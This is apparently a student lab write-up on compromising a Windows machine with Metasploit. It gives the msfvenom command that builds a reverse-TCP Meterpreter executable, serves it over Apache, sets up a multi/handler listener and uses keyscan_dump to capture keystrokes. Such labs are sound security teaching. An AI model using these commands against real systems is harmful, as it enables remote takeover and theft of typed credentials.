# Name: Gowtham N
# Reg no: 212222220013
# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig
## OUTPUT:

![image](https://github.com/user-attachments/assets/0aefccb0-15b1-4319-8950-3bde65b867b1)
Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
![image](https://github.com/user-attachments/assets/afa93003-0550-437f-af4b-556a420fa1c8)
copy the fun.exe into the apache /var/www/html folder
Start apache server
sudo systemctl apache2 start
![image](https://github.com/user-attachments/assets/42a365d9-0ae1-4572-a186-cd48d34f751e)
Check the status of apache2
![image](https://github.com/user-attachments/assets/e6ef442a-351d-484e-9bd1-bae96cac72da)
invoke msfconsole:
![image](https://github.com/user-attachments/assets/4d9b2ddd-a4c0-4434-a7c6-6bb64158b392)
## OUTPUT
![image](https://github.com/user-attachments/assets/abc2e1af-fa76-43b4-beac-c9ed33051d47)
Starting a command and control Server use multi/handler set PAYLOAD
windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![image](https://github.com/user-attachments/assets/11c47cce-71d4-453a-b9f0-94409937d6c6)
## OUTPUT:
![image](https://github.com/user-attachments/assets/3eae708c-dad1-4cf0-8ad4-0c44ddcfdaed)
keyscan_dump shows the keystrokes captured so far
## OUTPUT:
![image](https://github.com/user-attachments/assets/e32e88d8-75da-41d7-8037-71805d9e0032)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
